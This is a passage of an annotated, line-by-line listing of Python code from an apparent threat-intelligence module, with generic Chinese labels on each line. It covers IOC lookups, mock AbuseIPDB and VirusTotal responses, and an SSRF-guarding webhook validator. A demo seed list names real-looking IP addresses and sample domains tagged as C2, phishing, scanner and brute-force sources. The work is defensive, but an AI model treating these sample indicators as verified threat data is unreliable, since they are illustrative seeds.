| 3064 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "hit": True,` |
| 3065 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": True,` |
| 3066 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "score": row.get("score"),` |
| 3067 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "sources": row.get("sources", []),` |
| 3068 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": row.get("reason") or "命中本地 IOC（数据库）",` |
| 3069 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "added_at": row.get("added_at").isoformat() if row.get("added_at") else None,` |
| 3070 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "updated_at": row.get("updated_at").isoformat() if row.get("updated_at") else None,` |
| 3071 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "expires_at": exp.isoformat() if exp else None,` |
| 3072 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "metadata": row.get("metadata"),` |
| 3073 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "hits": row.get("hits", 0),` |
| 3074 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3075 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 3076 | 占位语句：保持语法完整但当前不执行操作。 | `        pass` |
| 3077 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3078 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3079 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "local",` |
| 3080 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": True,` |
| 3081 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hit": False,` |
| 3082 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": False,` |
| 3083 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "本地黑名单未命中",` |
| 3084 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3085 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3086 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3087 | 函数定义：声明 `_threat_intel_abuseipdb` 的输入、处理逻辑和返回结果。 | `def _threat_intel_abuseipdb(` |
| 3088 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ti: ThreatIntelCollector, ioc_type: str, value: str` |
| 3089 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 3090 | 条件判断：满足条件时进入对应分支。 | `    if ioc_type != "ip":` |
| 3091 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 3092 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "provider": "abuseipdb",` |
| 3093 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ok": False,` |
| 3094 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": "abuseipdb 仅支持 IP 查询",` |
| 3095 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 3096 | 条件判断：满足条件时进入对应分支。 | `    if ti.abuseipdb_key:` |
| 3097 | 返回结果：把处理后的值交回调用方。 | `        return ti.query_abuseipdb_detailed(value)` |
| 3098 | 条件判断：满足条件时进入对应分支。 | `    if _threat_intel_mock_enabled():` |
| 3099 | 返回结果：把处理后的值交回调用方。 | `        return _mock_abuseipdb(value)` |
| 3100 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "abuseipdb",` |
| 3102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": False,` |
| 3103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "api_key_missing",` |
| 3104 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3107 | 函数定义：声明 `_threat_intel_virustotal` 的输入、处理逻辑和返回结果。 | `def _threat_intel_virustotal(` |
| 3108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ti: ThreatIntelCollector, ioc_type: str, value: str` |
| 3109 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 3110 | 条件判断：满足条件时进入对应分支。 | `    if ti.virustotal_key:` |
| 3111 | 返回结果：把处理后的值交回调用方。 | `        return ti.query_provider("virustotal", ioc_type, value)` |
| 3112 | 条件判断：满足条件时进入对应分支。 | `    if _threat_intel_mock_enabled():` |
| 3113 | 返回结果：把处理后的值交回调用方。 | `        return _mock_virustotal(ioc_type, value)` |
| 3114 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "virustotal",` |
| 3116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": False,` |
| 3117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "api_key_missing",` |
| 3118 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3121 | 函数定义：声明 `_threat_intel_summarize` 的输入、处理逻辑和返回结果。 | `def _threat_intel_summarize(` |
| 3122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    results: Dict[str, Dict[str, Any]],` |
| 3123 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 3124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    is_malicious = False` |
| 3125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    max_score: Optional[int] = None` |
| 3126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    providers_hit: List[str] = []` |
| 3127 | 循环：逐个处理集合或迭代器中的元素。 | `    for prov, r in results.items():` |
| 3128 | 条件判断：满足条件时进入对应分支。 | `        if not r.get("ok"):` |
| 3129 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 3130 | 条件判断：满足条件时进入对应分支。 | `        if r.get("is_malicious") or r.get("hit"):` |
| 3131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            is_malicious = True` |
| 3132 | 函数调用：执行已有函数/方法完成当前步骤。 | `            providers_hit.append(prov)` |
| 3133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        s = r.get("score")` |
| 3134 | 条件判断：满足条件时进入对应分支。 | `        if isinstance(s, (int, float)) and s is not None:` |
| 3135 | 条件判断：满足条件时进入对应分支。 | `            if max_score is None or s > max_score:` |
| 3136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                max_score = int(s)` |
| 3137 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": is_malicious,` |
| 3139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "max_score": max_score,` |
| 3140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "providers_hit": providers_hit,` |
| 3141 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3144 | 函数定义：声明 `_mock_hash_int` 的输入、处理逻辑和返回结果。 | `def _mock_hash_int(seed: str, mod: int, offset: int = 0) -> int:` |
| 3145 | 文档字符串：说明当前模块、类或函数的职责。 | `    """基于稳定哈希把字符串映射到确定性整数区间。"""` |
| 3146 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import hashlib` |
| 3147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    digest = hashlib.sha256(seed.encode("utf-8")).digest()` |
| 3149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    num = int.from_bytes(digest[:8], "big")` |
| 3150 | 返回结果：把处理后的值交回调用方。 | `    return (num % mod) + offset` |
| 3151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3153 | 函数定义：声明 `_mock_abuseipdb` 的输入、处理逻辑和返回结果。 | `def _mock_abuseipdb(ip: str) -> Dict[str, Any]:` |
| 3154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    score = _mock_hash_int(f"abuseipdb:{ip}", 101)  # 0..100` |
| 3155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    countries = ("US", "CN", "RU", "BR", "DE", "NL", "GB", "SG", "JP")` |
| 3156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    isps = (` |
| 3157 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Mock Cloud Provider",` |
| 3158 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Fake Data Center, Inc.",` |
| 3159 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Demo Hosting LLC",` |
| 3160 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Sample ISP Holdings",` |
| 3161 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3162 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": True,` |
| 3164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "abuseipdb",` |
| 3165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "mocked": True,` |
| 3166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": score >= 50,` |
| 3167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": score,` |
| 3168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "country_code": countries[_mock_hash_int(f"cc:{ip}", len(countries))],` |
| 3169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "usage_type": "Data Center/Web Hosting/Transit",` |
| 3170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "isp": isps[_mock_hash_int(f"isp:{ip}", len(isps))],` |
| 3171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "domain": None,` |
| 3172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "total_reports": _mock_hash_int(f"reports:{ip}", 500),` |
| 3173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "last_reported_at": _now_iso(),` |
| 3174 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3176 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3177 | 函数定义：声明 `_mock_virustotal` 的输入、处理逻辑和返回结果。 | `def _mock_virustotal(ioc_type: str, value: str) -> Dict[str, Any]:` |
| 3178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    seed = f"vt:{ioc_type}:{value.lower()}"` |
| 3179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    malicious = _mock_hash_int(seed + ":mal", 20)` |
| 3180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    suspicious = _mock_hash_int(seed + ":sus", 10)` |
| 3181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    harmless = _mock_hash_int(seed + ":har", 50, offset=30)` |
| 3182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    undetected = _mock_hash_int(seed + ":und", 20, offset=5)` |
| 3183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reputation = _mock_hash_int(seed + ":rep", 101, offset=-50)  # -50..50` |
| 3184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    base = {` |
| 3185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": True,` |
| 3186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "virustotal",` |
| 3187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "mocked": True,` |
| 3188 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": malicious >= 3,` |
| 3189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "malicious": malicious,` |
| 3190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "suspicious": suspicious,` |
| 3191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "harmless": harmless,` |
| 3192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "undetected": undetected,` |
| 3193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reputation": reputation,` |
| 3194 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3195 | 条件判断：满足条件时进入对应分支。 | `    if ioc_type == "ip":` |
| 3196 | 函数调用：执行已有函数/方法完成当前步骤。 | `        base.update(` |
| 3197 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "country": _mock_abuseipdb(value)["country_code"],` |
| 3199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "as_owner": "AS65535 Mock Networks",` |
| 3200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "network": ".".join(value.split(".")[:3]) + ".0/24",` |
| 3201 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3202 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3203 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 3204 | 函数调用：执行已有函数/方法完成当前步骤。 | `        base.update(` |
| 3205 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "categories": {` |
| 3207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "Mock Vendor": "malware"` |
| 3208 | 条件判断：满足条件时进入对应分支。 | `                    if malicious >= 3` |
| 3209 | 兜底分支：处理前面条件都不满足的情况。 | `                    else "business",` |
| 3210 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 3211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "registrar": "Mock Registrar Ltd.",` |
| 3212 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3213 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3214 | 返回结果：把处理后的值交回调用方。 | `    return base` |
| 3215 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3216 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEMO_IOCS: Tuple[Dict[str, Any], ...] = (` |
| 3218 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 3219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "ip",` |
| 3220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "value": "185.220.101.1",` |
| 3221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source": "abuseipdb",` |
| 3222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "Tor exit node 高置信度滥用",` |
| 3223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "note": "来自威胁情报共享的样本",` |
| 3224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": 92,` |
| 3225 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 3226 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 3227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "ip",` |
| 3228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "value": "45.95.168.7",` |
| 3229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source": "manual",` |
| 3230 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "近期针对内部 API 的暴力登录来源",` |
| 3231 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": 78,` |
| 3232 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 3233 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 3234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "ip",` |
| 3235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "value": "194.26.29.254",` |
| 3236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source": "manual",` |
| 3237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "扫描器来源（多端口高速探测）",` |
| 3238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": 65,` |
| 3239 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 3240 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 3241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "domain",` |
| 3242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "value": "evil-example.com",` |
| 3243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source": "virustotal",` |
| 3244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "C2 回连域名（样本），分类为 malware",` |
| 3245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": 88,` |
| 3246 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 3247 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 3248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "domain",` |
| 3249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "value": "phish-test.xyz",` |
| 3250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source": "phishtank",` |
| 3251 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "钓鱼样本域名",` |
| 3252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": 70,` |
| 3253 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 3254 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 3255 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3256 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3257 | 函数定义：声明 `_seed_demo_iocs` 的输入、处理逻辑和返回结果。 | `def _seed_demo_iocs(app: Flask) -> int:` |
| 3258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ti: ThreatIntelCollector = app.extensions["guardian_threat_intel"]` |
| 3259 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.ioc_repository import IOCRepository` |
| 3260 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 3261 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created = 0` |
| 3263 | 循环：逐个处理集合或迭代器中的元素。 | `    for item in _DEMO_IOCS:` |
| 3264 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm, err = _validate_ioc_payload(dict(item))` |
| 3265 | 条件判断：满足条件时进入对应分支。 | `        if err or not norm:` |
| 3266 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 3267 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "[ThreatIntel] demo IOC 校验失败：%s -> %s",` |
| 3268 | 函数调用：执行已有函数/方法完成当前步骤。 | `                item.get("value"),` |
| 3269 | 代码语句：参与当前文件的业务流程或数据处理。 | `                err,` |
| 3270 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 3271 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 3272 | 函数调用：执行已有函数/方法完成当前步骤。 | `        IOCRepository(db.session).upsert_merge(` |
| 3273 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ioc_type=norm["type"],` |
| 3274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value=norm["value"],` |
| 3275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source=norm["source"],` |
| 3276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            reason=norm.get("reason"),` |
| 3277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            note=norm.get("note"),` |
| 3278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            score=norm.get("score"),` |
| 3279 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3280 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ti.add_ioc_to_blacklist(norm["type"], norm["value"])` |
| 3281 | 代码语句：参与当前文件的业务流程或数据处理。 | `        created += 1` |
| 3282 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.commit()` |
| 3283 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ti.refresh_local_from_db()` |
| 3284 | 返回结果：把处理后的值交回调用方。 | `    return created` |
| 3285 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3286 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3287 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 3288 | 注释：解释下面或当前这段代码的设计意图。 | `# 系统设置：默认值 / 校验 / 快照` |
| 3289 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 3290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_EMAIL_RE = re.compile(r"^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$")` |
| 3291 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_RATE_LIMIT_RE = re.compile(` |
| 3292 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r"^\d+\s+per\s+(second\|minute\|hour\|day)$", re.IGNORECASE` |
| 3293 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 3294 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3295 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3296 | 函数定义：声明 `_default_editable_settings` 的输入、处理逻辑和返回结果。 | `def _default_editable_settings() -> Dict[str, Any]:` |
| 3297 | 文档字符串：说明当前模块、类或函数的职责。 | `    """从环境变量 / get_config 提取初次启动时的可写字段默认值。"""` |
| 3298 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3299 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "detection_sensitivity": _safe_float(` |
| 3300 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("DETECTION_SENSITIVITY"), default=0.7, lo=0.0, hi=1.0` |
| 3301 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3302 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "alert_threshold": _safe_float(` |
| 3303 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("ALERT_THRESHOLD"), default=0.6, lo=0.0, hi=1.0` |
| 3304 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "alert_email": os.environ.get("ALERT_EMAIL", ""),` |
| 3306 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "alert_webhook": os.environ.get("ALERT_WEBHOOK", ""),` |
| 3307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_version": os.environ.get("MODEL_VERSION", "v1"),` |
| 3308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_hot_reload": os.environ.get("MODEL_HOT_RELOAD", "false").lower()` |
| 3309 | 代码语句：参与当前文件的业务流程或数据处理。 | `        == "true",` |
| 3310 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3311 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3312 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3313 | 函数定义：声明 `_safe_float` 的输入、处理逻辑和返回结果。 | `def _safe_float(` |
| 3314 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value: Optional[str], *, default: float, lo: float, hi: float` |
| 3315 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> float:` |
| 3316 | 条件判断：满足条件时进入对应分支。 | `    if value is None or value == "":` |
| 3317 | 返回结果：把处理后的值交回调用方。 | `        return default` |
| 3318 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 3319 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        v = float(value)` |
| 3320 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except (TypeError, ValueError):` |
| 3321 | 返回结果：把处理后的值交回调用方。 | `        return default` |
| 3322 | 返回结果：把处理后的值交回调用方。 | `    return max(lo, min(hi, v))` |
| 3323 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3324 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3325 | 函数定义：声明 `_validate_webhook_url` 的输入、处理逻辑和返回结果。 | `def _validate_webhook_url(url: str) -> Optional[str]:` |
| 3326 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Webhook URL 校验：与 \`\`check_webhook_url_safe\`\` 对齐，防 SSRF。"""` |
| 3327 | 条件判断：满足条件时进入对应分支。 | `    if not url or not str(url).strip():` |
| 3328 | 返回结果：把处理后的值交回调用方。 | `        return "empty"` |
| 3329 | 条件判断：满足条件时进入对应分支。 | `    if len(url) > 2048:` |
| 3330 | 返回结果：把处理后的值交回调用方。 | `        return "URL 长度过长"` |
| 3331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    chk = check_webhook_url_safe(str(url).strip())` |
| 3332 | 条件判断：满足条件时进入对应分支。 | `    if chk.ok:` |
| 3333 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 3334 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _reasons = {` |
| 3335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "empty_url": "URL 为空",` |
| 3336 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "parse_error": "URL 解析失败",` |
| 3337 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "scheme_not_http": "必须以 http:// 或 https:// 开头",` |
| 3338 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "missing_host": "缺少主机名",` |
| 3339 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "localhost_forbidden": "不允许使用 localhost",` |
| 3340 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "blocked_ip_literal": "不允许指向回环、链路本地、元数据或内网地址",` |
| 3341 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "dns_resolution_failed": "主机名无法解析",` |
| 3342 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "blocked_hostname": "不允许指向元数据或保留主机名",` |
| 3343 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3344 | 条件判断：满足条件时进入对应分支。 | `    if chk.reason.startswith("resolved_to_blocked:"):` |
| 3345 | 返回结果：把处理后的值交回调用方。 | `        return "DNS 解析结果指向禁止网段"` |
| 3346 | 返回结果：把处理后的值交回调用方。 | `    return _reasons.get(chk.reason, "Webhook 地址未通过安全检查")` |
| 3347 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3348 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3349 | 函数定义：声明 `_validate_settings_payload` 的输入、处理逻辑和返回结果。 | `def _validate_settings_payload(` |
| 3350 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Dict[str, Any],` |
| 3351 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    existing: Optional[Dict[str, Any]] = None,` |
| 3352 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Tuple[Dict[str, Any], Dict[str, str]]:` |
| 3353 | 文档字符串：说明当前模块、类或函数的职责。 | `    """返回 (normalized, errors_by_field)。只处理 schema 中白名单的字段。` |
| 3354 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3355 | 代码语句：参与当前文件的业务流程或数据处理。 | `    existing 用于跨字段校验（如 alert_threshold ≤ detection_sensitivity），` |
| 3356 | 代码语句：参与当前文件的业务流程或数据处理。 | `    即便用户只提交了其中一个字段也能拿到另一个的当前值。` |
| 3357 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 3358 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    existing = existing or {}` |
